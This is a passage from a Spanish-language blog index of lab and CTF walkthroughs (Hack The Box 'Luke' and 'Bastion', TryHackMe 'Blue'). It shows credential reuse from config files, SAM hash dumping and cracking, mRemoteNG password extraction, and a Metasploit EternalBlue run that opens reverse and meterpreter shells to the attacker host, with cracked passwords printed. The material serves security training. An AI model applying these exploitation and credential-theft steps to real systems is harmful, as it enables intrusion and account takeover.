\u0026#34;{\\\u0026#34;shell\\\u0026#34;: \\\u0026#34;sh -c $SHELL || sh\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.elements.ipmap.ElementsIPMapper\u0026#34;: \u0026#34;{\\\u0026#34;users\\\u0026#34;: {}}\u0026#34;, \u0026#34;ajenti.plugins.munin.client.MuninClient\u0026#34;: \u0026#34;{\\\u0026#34;username\\\u0026#34;: \\\u0026#34;username\\\u0026#34;, \\\u0026#34;prefix\\\u0026#34;: \\\u0026#34;http://localhost:8080/munin\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;123\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.dashboard.dash.Dash\u0026#34;: \u0026#34;{\\\u0026#34;widgets\\\u0026#34;: [{\\\u0026#34;index\\\u0026#34;: 0, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.memory.MemoryWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 1, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.memory.SwapWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 2, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.dashboard.welcome.WelcomeWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 0, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.uptime.UptimeWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 1, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.power.power.PowerWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 2, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.cpu.CPUWidget\\\u0026#34;}]}\u0026#34;, \u0026#34;ajenti.plugins.elements.shaper.main.Shaper\u0026#34;: \u0026#34;{\\\u0026#34;rules\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.plugins.ajenti_org.main.AjentiOrgReporter\u0026#34;: \u0026#34;{\\\u0026#34;key\\\u0026#34;: null}\u0026#34;, \u0026#34;ajenti.plugins.logs.main.Logs\u0026#34;: \u0026#34;{\\\u0026#34;root\\\u0026#34;: \\\u0026#34;/var/log\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.mysql.api.MySQLDB\u0026#34;: \u0026#34;{\\\u0026#34;password\\\u0026#34;: \\\u0026#34;\\\u0026#34;, \\\u0026#34;user\\\u0026#34;: \\\u0026#34;root\\\u0026#34;, \\\u0026#34;hostname\\\u0026#34;: \\\u0026#34;localhost\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.fm.fm.FileManager\u0026#34;: \u0026#34;{\\\u0026#34;root\\\u0026#34;: \\\u0026#34;/\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.tasks.manager.TaskManager\u0026#34;: \u0026#34;{\\\u0026#34;task_definitions\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.users.UserManager\u0026#34;: \u0026#34;{\\\u0026#34;sync-provider\\\u0026#34;: \\\u0026#34;\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.usersync.adsync.ActiveDirectorySyncProvider\u0026#34;: \u0026#34;{\\\u0026#34;domain\\\u0026#34;: \\\u0026#34;DOMAIN\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;\\\u0026#34;, \\\u0026#34;user\\\u0026#34;: \\\u0026#34;Administrator\\\u0026#34;, \\\u0026#34;base\\\u0026#34;: \\\u0026#34;cn=Users,dc=DOMAIN\\\u0026#34;, \\\u0026#34;address\\\u0026#34;: \\\u0026#34;localhost\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.elements.usermgr.ElementsUserManager\u0026#34;: \u0026#34;{\\\u0026#34;groups\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.plugins.elements.projects.main.ElementsProjectManager\u0026#34;: \u0026#34;{\\\u0026#34;projects\\\u0026#34;: \\\u0026#34;KGxwMQou\\\\n\\\u0026#34;}\u0026#34; }, \u0026#34;password\u0026#34;: \u0026#34;KpMasng6S5EtTy9Z\u0026#34;, \u0026#34;permissions\u0026#34;: [] } }, \u0026#34;language\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;bind\u0026#34;: { \u0026#34;host\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;port\u0026#34;: 8000 }, \u0026#34;enable_feedback\u0026#34;: true, \u0026#34;ssl\u0026#34;: { \u0026#34;enable\u0026#34;: false, \u0026#34;certificate_path\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;authentication\u0026#34;: true, \u0026#34;installation_id\u0026#34;: 12354 }   config.php 1  $dbHost = \u0026#39;localhost\u0026#39;; $dbUsername = \u0026#39;root\u0026#39;; $dbPassword = \u0026#39;Zk6heYCyv6ZE9Xcg\u0026#39;; $db = \u0026#34;login\u0026#34;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(\u0026#34;Connect failed: %s\\n\u0026#34;. $conn -\u0026gt; error);   login.php Nos enfocamos en el archivo config.json el cual contiene configuracion del mismo usuario root, contraseña, y algunas otras configuraciones, una de las cuales nos muestra el host y puerto. Las credenciales:\n1 2  user: root password: KpMasng6S5EtTy9Z   Utilizamos las credenciales en el puerto 8000 y pudimos logearnos a la plataforma Ajenti.\nSHELL - USER/ROOT Utilizamos la opcion de TERMINAL que nos ofrece Ajenti y obtenemos una shell como usuario root, y las banderas user.txt/root.txt.\nSHELL ","description":"","id":77,"section":"posts","tags":["freebsd"],"title":"Hack The Box - Luke","uri":"https://sckull.github.io/posts/luke/"},{"content":"Bastion es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Bastion     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.134   Maker L4mje    MASSCAN Escaneo de puertos UDP/TCP con masscan.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@sckull:~/htb/bastion# masscan -p1-65535,U:1-65535 10.10.10.134 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-07 17:02:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.134 Discovered open port 135/tcp on 10.10.10.134 Discovered open port 5985/tcp on 10.10.10.134 Discovered open port 49664/tcp on 10.10.10.134 Discovered open port 49666/tcp on 10.10.10.134 Discovered open port 445/tcp on 10.10.10.134 Discovered open port 49668/tcp on 10.10.10.134 Discovered open port 139/tcp on 10.10.10.134 Discovered open port 49667/tcp on 10.10.10.134 Discovered open port 47001/tcp on 10.10.10.134 Discovered open port 49670/tcp on 10.10.10.134 Discovered open port 49669/tcp on 10.10.10.134   NMAP Escaneo de puertos TCP con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  root@sckull:~/htb/bastion# nmap -p49667,139,49670,445,49669,49668,135,49666,22 -sV -A -O 10.10.10.134 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-07 18:58 BST Nmap scan report for 10.10.10.134 Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56🆎19:97:d5:bb:03:fb:82💿63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microso$t Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -39m52s, deviation: 1h09m14s, median: 5s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-05-07T20:00:16+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-05-07 19:00:12 |_ start_date: 2019-05-07 10:50:40 TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 123.61 ms 10.10.14.1 2 123.96 ms 10.10.10.134 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.98 seconds   SMB Escaneo de sharenames en SMB con smbclient.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~/htb/bastion# smbclient -L \\\\10.10.10.134 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Backups Disk C$ Disk Default share IPC$ IPC Remote IPC Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available   SMB - Backups Encontramos una nota (note.txt) en el sharename de Backups, esta nos habla de un backup.\nnote.txt\nTambien encontramos una carpeta de un backup de la maquina en \\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\ dentro encontramos varios archivos xml y archivo vhd.\nSMB - Montar archivo VHD Mount VHD stored\nPara poder ver lo que contiene el archivo backup en SMB montamos el SHARENAME localmente para luego hacer lo mismo con el backup y poder ver los archivos en su interior. Para ello utilizamos una maquina Windows.\nComandos:\n1 2 3 4 5 6 7  net use h: \\\\10.10.10.134\\Backups DISKPART SELECT VDISK FILE=\u0026#34;H:\\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd\u0026#34; ATTACH VDISK ASSIGN LETTER=E exit dir e:   SAM - PASSWORD [HASH] Ahora que tenemos acceso al backup de la maquina podemos buscar contraseñas guardadas, existen diferentes lugares y archivos donde podemos encontrar contraseñas almacenadas (Password Stored), en esta maquina las encontramos en C:\\Windows\\System32\\config\\, donde podemos ver dos archivos uno llamado SAM y otro SYSTEM los cuales contienen hashes de autenticacion almacenadas por SAM (Security Account Manager).\nPara obtener los hash podemos utilizar mimikatz y samdump2.\n1  mimikatz - lsadump::sam   samdump2 - SYSTEM SAM Utilizamos los hash para ver los permisos del usuario L4mpje en los SHARENAMES.\n1  aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9   Crack HASH - hashcat, john 1  hashcat/hashcat64.bin -m 1000 bastion.txt rockyou.txt -o bastion_pass.txt   1  john --format=NT-old --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   Cracked:\n26112010952d963c8dc4217daec986d9:bureaulampje\nSHELL SSH - L4mpje Ahora que tenemos la contraseña para el usuario L4ampje podemos logearnos en el servicio ssh.\nObtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION - nRemoteNG Al enumerar los programas nos encontramos con uno no muy comun en maquinas windows mRemoteNG.\n![image](/images/posts/htb/bastion/Screenshot from 2019-05-08 00.35.33.webp)\nAl investigar un poco sobre este programa y sus vulnerabilidades encontramos que los archivos de configuracion contienen contraseñas encriptadas y las cuales pueden ser facilmente desencriptadas (Stealing Password from mremote). Lastimosamente es una vulnerabilidad que no afecta a esta version del programa.\nArchivos de configuracion (c:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG).\nUtilizamos mRemoteNG para ver el fuincionamiento de los archivos de configuracion. Para ello creamos un nuevo archivo de configuracion agregamos las credenciales del usuario L4mpje y utilizamos la opcion de SSH2, como vemos nos pudimos conectar exitosamente mediante ssh con el programa.\nAl guardar el archivo de conexion vemos que es un archivo XML, dicho archivo tiene la misma estructura del archivo de configuracion que tiene la maquina en AppData. Eliminamos la conexion de la lista de conexiones en mRemoteNG e importamos nuevamente el archivo que habiamos guardado (Bastion_file.xml), al cargarse este archivo se cargaron las credenciales y la configuracion de SSH2 anteriormente realizadas.\nEstructura del archivo XML\nAhora que sabemos que podemos importar un archivo de configuracion, vamos a intentar impoartar el archivo de configuracion que esta en la maquina, para ello lo descargamos. Vemos la misma configuracion que tiene nuestro archivo que guardamos anteriormente.\nImportamos el archivo al programa y nos muestra dos conexiones una del usuario Administrador y de L4mpje.\nConexion DC\nConexion L4mpje-PC\nComo podemos ver las direcciones IP a las que estan configuradas esas conexiones son locales vamos a cambiarlas y dirigirlas a la IP de la maquina (10.10.10.134), de la misma forma para el SSH e intentamos conectarnos.\nL4mpje\nAdministrator - Shell Finalmente obtenemos una shell como Administrador y nuestra bandera root.txt.\nAl investigar acerca del crackeo de Contraseñas, encontre un post mRemote Crack Password en el cual muestra que podemos sacar la contraseña de cualquier conexion o configuracion de conexion mediante la creacion de una Herramienta externa con los siguientes datos:\n1 2  File Name : cmd Arguments : /k echo %password%   Para extraer la contraseña seleccionamos la conexion y le damos a ejecutar Herramienta externa \u0026gt; Seleccionamos la que hemos creado.\nAsi es como obtenemos la contraseña de Administrator y L4mpje.\n1 2  Administrator:thXLHM96BeKL0ER2 L4mpje:bureaulampje   ","description":"","id":78,"section":"posts","tags":["windows"],"title":"Hack The Box - Bastion","uri":"https://sckull.github.io/posts/bastion/"},{"content":"Blue es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Blue     Room Blue   Info Deploy \u0026amp; hack into a Windows machine, leveraging common misconfigurations issues.   RoomCode blue   Puntos 3850   Dificultad Relativamente Facil   Maker DarkStar7471    MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  root@kali:~/trymehack/blue# masscan -p1-65535,U:1-65535 10.10.24.91 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-04 00:56:01 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49153/tcp on 10.10.24.91 Discovered open port 49154/tcp on 10.10.24.91 Discovered open port 49152/tcp on 10.10.24.91 Discovered open port 137/udp on 10.10.24.91 Discovered open port 3389/tcp on 10.10.24.91 # Nmap 7.70 scan initiated Tue Sep 3 21:03:21 2019 as: nmap -sC -sV -p1-1000 -o nmap.scan_mil 10.10.24.91 Nmap scan report for 10.10.24.91 Host is up (0.23s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:ae:0a:27:4e:02 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-09-03T20:04:00-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-09-03 21:04:00 |_ start_date: 2019-09-03 20:54:40 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 21:04:06 2019 -- 1 IP address (1 host up) scanned in 45.67 seconds   SMBCLIENT \u0026amp; SMBMAP Escaneo de sharenames.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@kali:~/trymehack/blue# smbclient -L \\\\10.10.24.91 Enter WORKGROUP\\root\u0026#39;s password: Anonymous login successful Sharename Type Comment --------- ---- ------- smb1cli_req_writev_submit: called for dialect[SMB2_10] server[10.10.24.91] Error returning browse list: NT_STATUS_REVISION_MISMATCH Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.24.91 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available root@kali:~/trymehack/blue# smbmap -H 10.10.24.91 [+] Finding open SMB ports.... root@kali:~/trymehack/blue#   NMAP - SMB SCRIPTS Utilizamos los scripts de nmap para verificar si alguno es vulnerable con la maquina, y, encontramos que es vulnerable a ms17-010 o ETERNALBLUE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  root@kali:~/trymehack/blue# nmap --script smb-vuln-* 10.10.24.91 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 21:11 EDT Nmap scan report for 10.10.24.91 Host is up (0.20s latency). Not shown: 991 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49158/tcp open unknown 49159/tcp open unknown Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 42.25 seconds   METASPLOIT - ETERNALBLUE Utilizamos metasploit y el exploit exploit/windows/smb/ms17_010_eternalblue contra la maquina, lo configuramos y corremos el exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  msf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhosts 10.10.24.91 rhosts =\u0026gt; 10.10.24.91 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show targets Exploit targets: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.1.72:4444 [+] 10.10.24.91:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.24.91:445 - Connecting to target for exploitation. [+] 10.10.24.91:445 - Connection established for exploitation. [+] 10.10.24.91:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.24.91:445 - CORE raw buffer dump (42 bytes) [*] 10.10.24.91:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.24.91:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.24.91:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.24.91:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.24.91:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.24.91:445 - Sending all but last fragment of exploit packet [*] 10.10.24.91:445 - Starting non-paged pool grooming [+] 10.10.24.91:445 - Sending SMBv2 buffers [+] 10.10.24.91:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.24.91:445 - Sending final SMBv2 buffers. [*] 10.10.24.91:445 - Sending last fragment of exploit packet! [*] 10.10.24.91:445 - Receiving response from exploit packet [+] 10.10.24.91:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.24.91:445 - Sending egg to corrupted connection. [*] 10.10.24.91:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196) at 2019-09-03 21:15:49 -0400 [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;   UPGRADE SHELL - METERPRETER Utilizamos el eexploit de post explotacion multi/manage/shell_to_meterpreter para actualizar nuestra shell a meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196 (10.10.24.91) msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; search shell_to_meterpreter Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 post/multi/manage/shell_to_meterpreter normal No Shell to Meterpreter Upgrade msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set session 1 session =\u0026gt; 1 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.1.72:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (179779 bytes) to 10.10.24.91 [*] Meterpreter session 2 opened (10.8.1.72:4433 -\u0026gt; 10.10.24.91:49203) at 2019-09-03 21:21:37 -0400 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196 (10.10.24.91) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.1.72:4433 -\u0026gt; 10.10.24.91:49203 (10.10.24.91) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt;   METASPLOIT - HASHDUMP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  meterpreter \u0026gt; run post/windows/gather/hashdump [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... Jon:\u0026#34;Nah boi, I ain\u0026#39;t sharing nutting with you\u0026#34; [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter \u0026gt;   JOHN - CRACK PASSWORDS Crackeamos las contraseñas con john.\n1 2 3 4 5 6 7 8 9 10 11 12  root@kali:~/trymehack/blue# john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status (Administrator) alqfna22 (Jon) 2g 0:00:00:00 DONE (2019-09-03 21:34) 2.061g/s 10515Kp/s 10515Kc/s 10520KC/s alqui..alpusidi Warning: passwords printed above might not be all those cracked Use the \u0026#34;--show --format=NT\u0026#34; options to display all of the cracked passwords reliably Session completed root@kali:~/trymehack/blue#   FLAGS Encontrando las flags.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  meterpreter \u0026gt; ls Listing: C:\\ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-13 23:18:56 -0400 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:08 -0400 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-12 18:01:17 -0500 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Users 40777/rwxrwxrwx 16384 dir 2009-07-13 23:20:08 -0400 Windows 100666/rw-rw-rw- 24 fil 2018-12-12 22:47:39 -0500 flag1.txt 567211570/r-xrwx--- 438533065912909807 fif 13905563959-04-24 15:54:40 -0400 hiberfil.sys 567211570/r-xrwx--- 438533065912909807 fif 13905563959-04-24 15:54:40 -0400 pagefile.sys meterpreter \u0026gt; cat flag1.txt flag{******************} meterpreter \u0026gt; pwd C:\\ meterpreter \u0026gt;   Utilizamos dir para encontrar los archivos que lleven el nombre de \u0026ldquo;flag\u0026rdquo;.\nComando:\n1  dir flag* /s /p   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  C:\\\u0026gt;dir flag* /s /p dir flag* /s /p Volume in drive C has no label. Volume Serial Number is E611-0B66 Directory of C:\\  03/17/2019 02:27 PM 24 flag1.txt 1 File(s) 24 bytes Directory of 